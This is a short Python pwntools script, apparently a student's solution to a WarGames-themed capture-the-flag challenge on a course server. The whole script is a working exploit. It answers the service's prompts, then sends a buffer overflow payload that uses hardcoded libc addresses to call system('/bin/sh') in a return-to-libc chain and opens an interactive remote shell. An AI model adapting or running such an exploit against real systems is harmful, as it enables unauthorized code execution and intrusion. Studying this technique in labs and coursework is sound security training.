# wargamesex.py - Aidan Wech (Onyxymous)
from pwn import *
import time

# ssh variables
host = 'cs4401shell.walls.ninja'
port = 39448

# exploit variables
code = b'CPE 1704 TKS'
offset = 496
yes = b'Y'
system = 0x7ffff7a523a0
baseaddr = system - 0x453a0
binsh = baseaddr + 0x18ce57

log.info(f'Base LIBC Address: {hex(baseaddr)}')
log.info(f'System Address: {hex(system)}')
log.info(f'/bin/sh Address: {hex(binsh)}')

# exploit string
exploit = flat(
    {
        0: yes,
        offset: binsh
    },
    system
)

# process instructions
p = remote(host, port)
time.sleep(3)
p.recvline(timeout=1)

p.sendline(b'Y')		# Shall we play a game?
time.sleep(3)
p.recvline(timeout=1)

p.sendline(b'Y')		# How about Global Thermonuclear War?
time.sleep(3)
p.recvline(timeout=1)

p.sendline(code) 		# Please enter the code to trigger the launch system
time.sleep(7)
p.recvline(timeout=1)
p.recvline(timeout=1)
p.recvline(timeout=1)
p.recvline(timeout=1)

p.sendline(exploit)		# How about a nice game of chess?
time.sleep(2)
p.interactive()
p.wait()
